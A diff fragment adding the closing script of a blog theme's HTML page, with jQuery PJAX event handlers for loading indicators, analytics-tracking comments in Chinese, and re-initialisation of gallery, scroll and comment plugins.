+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
